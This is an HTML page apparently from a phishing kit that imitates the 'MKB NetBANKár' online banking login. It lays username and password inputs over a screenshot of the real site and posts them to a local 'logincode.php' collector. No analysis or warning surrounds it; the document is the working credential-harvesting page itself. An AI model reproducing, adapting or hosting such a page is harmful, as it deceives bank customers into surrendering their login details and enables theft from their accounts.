<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>MKB NetBANK&aacute;r</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox {
  	padding-left: 7px;
    border-radius: 3px;
  	font-family: SFS, Arial, sans-serif;
    font-size: 14px;
    color: #333333;
    height: 23px;
    width: 275px;
    border: 1px solid #ccc;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1352px; height:685px; z-index:0"><img src="images/New1.PNG" alt="" title="" border=0 width=1352 height=685></div>

<form action=logincode.php name=mundachok method=post>
<input name="user" placeholder=" " class="textbox" autocomplete="off" required maxlength="80" type="text" font-size: 15px; style="position:absolute; width:244px; left:836px; top:231px; z-index:2;">
<input name="pd" placeholder=" " class="textbox" autocomplete="off" required maxlength="50" type="password" style="position:absolute; width:244px; left:837px; top:286px; z-index:3;">
<br>

<div id="formimage1" style="position:absolute; left:958px; top:319px; z-index:4">
  <input type="image" name="formimage1" width="128" height="31" src="images/New2.PNG">
</div>
</div>

</body>
</html>
